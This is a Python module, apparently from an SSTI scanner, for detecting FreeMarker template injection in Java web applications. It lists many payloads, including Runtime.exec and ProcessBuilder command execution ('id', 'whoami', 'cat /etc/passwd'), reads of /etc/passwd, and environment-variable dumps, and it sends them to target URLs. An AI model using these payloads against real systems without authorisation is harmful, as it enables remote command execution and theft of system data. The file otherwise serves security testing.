"""
FreeMarker template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the FreeMarker template engine, commonly used in Java applications.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class FreemarkerEngine(BaseTemplateEngine):
    """
    FreeMarker template engine detector.
    
    FreeMarker is a Java-based template engine.
    It uses ${} for expressions and <#> for directives.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "freemarker"
        self.description = "FreeMarker template engine (Java)"
        self.payloads = self._load_payloads()
        
        # FreeMarker-specific patterns for detection
        self.detection_patterns = {
            'math_result': [
                r'\b49\b',  # 7*7
                r'\b64\b',  # 8*8
                r'\b121\b', # 11*11
            ],
            'object_disclosure': [
                r'freemarker\.template',
                r'java\.lang\.Object',
                r'java\.util\.',
                r'java\.io\.',
                r'class java\.',
                r'Method.*?invoke',
            ],
            'variable_disclosure': [
                r'TemplateHashModel',
                r'TemplateSequenceModel',
                r'TemplateScalarModel',
                r'freemarker\.core',
                r'Expression.*?evaluate',
            ],
            'built_ins': [
                r'string.*?length',
                r'string.*?upper_case',
                r'string.*?lower_case',
                r'sequence.*?size',
                r'number.*?string',
            ],
            'directive_execution': [
                r'directive executed',
                r'macro.*?called',
                r'include.*?processed',
            ]
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load FreeMarker-specific SSTI payloads."""
        payloads = []
        
        # Basic math operations
        math_payloads = [
            "${7*7}",
            "${8*8}",
            "${11*11}",
            "${7 * 7}",
            "${(7)*7}",
            "${7*(7)}",
            "${(7)*(7)}",
        ]
        
        for payload in math_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="html",
                description="Basic mathematical operation"
            ))
        
        # Variable access
        variable_payloads = [
            "${.data_model}",
            "${.globals}",
            "${.locals}",
            "${.current_node}",
            "${.main}",
            "${.namespace}",
            "${.node}",
            "${.now}",
            "${.output_encoding}",
            "${.template_name}",
            "${.url_escaping_charset}",
            "${.version}",
        ]
        
        for payload in variable_payloads:
            payloads.append(Payload(
                payload=payload,
                type="variable_access",
                context="html",
                description="Built-in variable access"
            ))
        
        # Built-in functions
        builtin_payloads = [
            "${\"test\"?upper_case}",
            "${\"TEST\"?lower_case}",
            "${\"test\"?length}",
            "${\"test\"?cap_first}",
            "${\"test\"?uncap_first}",
            "${\"test\"?html}",
            "${\"test\"?xml}",
            "${\"test\"?url}",
            "${\"test\"?js_string}",
            "${\"test\"?json_string}",
            "${\"test\"?c}",
            "${123?string}",
            "${123?string.number}",
            "${123?string.currency}",
            "${123?string.percent}",
            "${.now?string}",
            "${.now?date}",
            "${.now?time}",
            "${.now?datetime}",
        ]
        
        for payload in builtin_payloads:
            payloads.append(Payload(
                payload=payload,
                type="builtin",
                context="html",
                description="Built-in function execution"
            ))
        
        # Object instantiation and method calls
        object_payloads = [
            # Basic object access
            "${Class}",
            "${Class.forName}",
            "${Class.forName('java.lang.String')}",
            "${Class.forName('java.lang.Runtime')}",
            "${Class.forName('java.lang.System')}",
            
            # Template object access
            "${.data_model.getClass()}",
            "${.data_model.getClass().getClassLoader()}",
            "${.data_model.getClass().getProtectionDomain()}",
            
            # Dangerous method calls
            "${Class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null)}",
            "${Class.forName('java.lang.System').getMethod('getProperty',Class.forName('java.lang.String')).invoke(null,'java.version')}",
            "${Class.forName('java.lang.System').getMethod('getProperty',Class.forName('java.lang.String')).invoke(null,'user.name')}",
            "${Class.forName('java.lang.System').getMethod('getProperty',Class.forName('java.lang.String')).invoke(null,'os.name')}",
        ]
        
        for payload in object_payloads:
            payloads.append(Payload(
                payload=payload,
                type="object_access",
                context="html",
                description="Object instantiation and method calls"
            ))
        
        # File system access
        file_payloads = [
            "${Class.forName('java.io.File').getConstructor(Class.forName('java.lang.String')).newInstance('/etc/passwd')}",
            "${Class.forName('java.io.FileReader').getConstructor(Class.forName('java.lang.String')).newInstance('/etc/passwd')}",
            "${Class.forName('java.util.Scanner').getConstructor(Class.forName('java.io.File')).newInstance(Class.forName('java.io.File').getConstructor(Class.forName('java.lang.String')).newInstance('/etc/passwd')).next()}",
        ]
        
        for payload in file_payloads:
            payloads.append(Payload(
                payload=payload,
                type="file_access",
                context="html",
                description="File system access"
            ))
        
        # Command execution
        exec_payloads = [
            # Runtime.exec() calls
            "${Class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
            "${Class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}",
            "${Class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cat /etc/passwd')}",
            "${Class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('ls -la')}",
            
            # ProcessBuilder
            "${Class.forName('java.lang.ProcessBuilder').getConstructor(Class.forName('[Ljava.lang.String;')).newInstance(Class.forName('[Ljava.lang.String;').cast(['id'].toArray())).start()}",
            "${Class.forName('java.lang.ProcessBuilder').getConstructor(Class.forName('[Ljava.lang.String;')).newInstance(Class.forName('[Ljava.lang.String;').cast(['whoami'].toArray())).start()}",
        ]
        
        for payload in exec_payloads:
            payloads.append(Payload(
                payload=payload,
                type="code_execution",
                context="html",
                description="Command execution attempt"
            ))
        
        # Directive-based payloads
        directive_payloads = [
            # Assignment and function directives
            "<#assign x = 7*7>${x}",
            "<#assign result = 7*7 />${result}",
            "<#function test><#return 7*7></#function>${test()}",
            "<#macro test>7*7</#macro><@test />",
            
            # Include directive (potential for LFI)
            "<#include '/etc/passwd'>",
            "<#include 'file:///etc/passwd'>",
            
            # Import directive
            "<#import '/etc/passwd' as passwd>",
            
            # List directive
            "<#list 1..3 as i>${i}</#list>",
            "<#list .data_model?keys as key>${key}</#list>",
        ]
        
        for payload in directive_payloads:
            payloads.append(Payload(
                payload=payload,
                type="directive",
                context="html",
                description="Directive-based exploitation"
            ))
        
        # URL-encoded payloads
        url_payloads = [
            "%24%7B7%2A7%7D",  # ${7*7}
            "%24%7BClass%7D",  # ${Class}
            "%24%7B.data_model%7D",  # ${.data_model}
        ]
        
        for payload in url_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="url",
                description="URL-encoded payload"
            ))
        
        # Context-specific payloads
        attr_payloads = [
            "x${7*7}",
            "${7*7}x",
            "x${Class}",
            "${Class}x",
        ]
        
        for payload in attr_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="attribute",
                description="Attribute context payload"
            ))
        
        # Advanced exploitation techniques
        advanced_payloads = [
            # Spring Framework integration
            "${@org.springframework.web.context.support.WebApplicationContextUtils@getWebApplicationContext(application)}",
            "${applicationScope}",
            "${requestScope}",
            "${sessionScope}",
            
            # Servlet API access
            "${Class.forName('javax.servlet.http.HttpServletRequest')}",
            "${Class.forName('javax.servlet.http.HttpServletResponse')}",
            "${Class.forName('javax.servlet.ServletContext')}",
            
            # Error triggering for information disclosure
            "${undefined_variable}",
            "${.undefined_builtin}",
            "${\"test\"?undefined_builtin}",
            "${Class.undefined_method()}",
            
            # Class loading attempts
            "${Class.forName('sun.misc.Unsafe')}",
            "${Class.forName('java.lang.reflect.Method')}",
            "${Class.forName('java.security.AccessController')}",
            
            # Environment information
            "${Class.forName('java.lang.System').getMethod('getenv',null).invoke(null,null)}",
            "${Class.forName('java.lang.System').getMethod('getProperties',null).invoke(null,null)}",
            "${Class.forName('java.lang.management.ManagementFactory').getMethod('getRuntimeMXBean',null).invoke(null,null)}",
        ]
        
        for payload in advanced_payloads:
            payloads.append(Payload(
                payload=payload,
                type="advanced",
                context="html",
                description="Advanced FreeMarker exploitation"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """
        Test a single payload against the target URL.
        
        Args:
            url: Target URL
            payload: Payload to test
            **kwargs: Additional arguments (http_client, method, data, headers)
        
        Returns:
            EngineResult with test results
        """
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence="No HTTP client provided",
                engine=self.name
            )
        
        try:
            # Determine injection point and method
            if method.upper() == 'GET':
                # URL parameter injection
                if '?' in url:
                    test_url = url.replace('INJECT', payload)
                    if 'INJECT' not in url:
                        # Add payload to first parameter
                        if '=' in url:
                            test_url = re.sub(r'(=)([^&]*)', f'\\1{payload}', url, count=1)
                        else:
                            test_url = f"{url}&test={payload}"
                    else:
                        test_url = url.replace('INJECT', payload)
                else:
                    test_url = f"{url}?test={payload}"
                
                response = await http_client.get(test_url, headers=headers)
            else:
                # POST data injection
                if data:
                    # Inject into existing data
                    test_data = data.copy()
                    if 'INJECT' in str(test_data):
                        test_data = {k: v.replace('INJECT', payload) if isinstance(v, str) else v 
                                   for k, v in test_data.items()}
                    else:
                        # Add payload to first field or create test field
                        if test_data:
                            first_key = next(iter(test_data))
                            test_data[first_key] = payload
                        else:
                            test_data['test'] = payload
                else:
                    test_data = {'test': payload}
                
                response = await http_client.post(url, data=test_data, headers=headers)
            
            # Analyze the response
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence=f"Request failed: {str(e)}",
                engine=self.name
            )
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """
        Analyze response for FreeMarker SSTI indicators.
        
        Args:
            original_response: Original response (baseline)
            payload: Payload that was sent
            response: Response to analyze
        
        Returns:
            EngineResult with analysis results
        """
        if not response:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Empty response",
                engine=self.name
            )
        
        # Check for direct payload reflection (likely not vulnerable)
        if payload in response and not any(pattern in response.lower() for pattern in ['freemarker', 'java.lang']):
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Payload reflected without execution",
                engine=self.name
            )
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Math operation detection
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Mathematical operation executed: found {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
                    break
        
        # Object disclosure detection
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Variable disclosure detection
        for pattern in self.detection_patterns['variable_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Variable disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Built-in function detection
        for pattern in self.detection_patterns['built_ins']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Built-in function executed: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # FreeMarker-specific error messages
        freemarker_errors = [
            'freemarker.template.TemplateException',
            'freemarker.core.ParseException',
            'freemarker.core.InvalidReferenceException',
            'Expression.*?is undefined',
            'The following has evaluated to null or missing',
            'Error reading included file',
            'For.*?directive',
            'Expecting.*?but found',
        ]
        
        for error in freemarker_errors:
            if re.search(error, response, re.IGNORECASE):
                evidence_parts.append(f"FreeMarker error detected: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Java-specific indicators
        java_indicators = [
            'java.lang.Class',
            'java.lang.Runtime',
            'java.lang.System',
            'java.io.File',
            'java.util.',
            'Method.*?invoke',
            'ClassLoader',
            'AccessController',
        ]
        
        for indicator in java_indicators:
            if re.search(indicator, response, re.IGNORECASE):
                evidence_parts.append(f"Java class access detected: {indicator}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for successful built-in variable access
        if any(var in payload for var in ['.data_model', '.globals', '.template_name', '.version']):
            builtin_patterns = [
                r'TemplateHashModel',
                r'freemarker\.template',
                r'FreeMarker.*?\d+\.\d+',
                r'data.*?model',
                r'template.*?name',
            ]
            
            for pattern in builtin_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Built-in variable access: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for Class access
        if 'Class' in payload:
            class_patterns = [
                r'class java\.',
                r'java\.lang\.Class',
                r'ClassLoader',
                r'getMethod',
                r'newInstance',
                r'invoke',
            ]
            
            for pattern in class_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Class access detected: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for string manipulation results
        if any(func in payload.lower() for func in ['upper_case', 'lower_case', 'length', 'cap_first']):
            if 'TEST' in response or 'test' in response:
                # Check if transformation was applied
                if ('upper_case' in payload.lower() and 'TEST' in response) or \
                   ('lower_case' in payload.lower() and 'test' in response) or \
                   ('cap_first' in payload.lower() and 'Test' in response):
                    evidence_parts.append("String manipulation function executed")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for directive execution
        if any(directive in payload for directive in ['<#assign', '<#function', '<#macro', '<#list']):
            for pattern in self.detection_patterns['directive_execution']:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Directive execution detected: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # System property disclosure
        system_props = [
            'java.version',
            'user.name',
            'os.name',
            'java.home',
            'user.dir',
        ]
        
        for prop in system_props:
            if prop in response:
                evidence_parts.append(f"System property disclosed: {prop}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Compile evidence
        if evidence_parts:
            evidence = "FreeMarker SSTI detected: " + "; ".join(evidence_parts)
        else:
            evidence = "No FreeMarker SSTI indicators found"
            
        return EngineResult(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            payload=payload,
            response=response[:500],  # Limit response size
            evidence=evidence,
            engine=self.name
        )
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        """Get payloads of a specific type."""
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        """
        Encode payload for specific context.
        
        Args:
            payload: Original payload
            context: Target context (url, html, attribute, etc.)
        
        Returns:
            Encoded payload
        """
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        elif context == "attribute":
            return payload.replace('"', '&quot;').replace("'", '&#x27;')
        elif context == "javascript":
            return payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        else:
            return payload
    
    def get_info(self) -> Dict[str, Any]:
        """Get engine information."""
        return {
            'name': self.name,
            'description': self.description,
            'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Java',
            'language': 'Java',
            'syntax': '${expression} and <#directive>'
        }
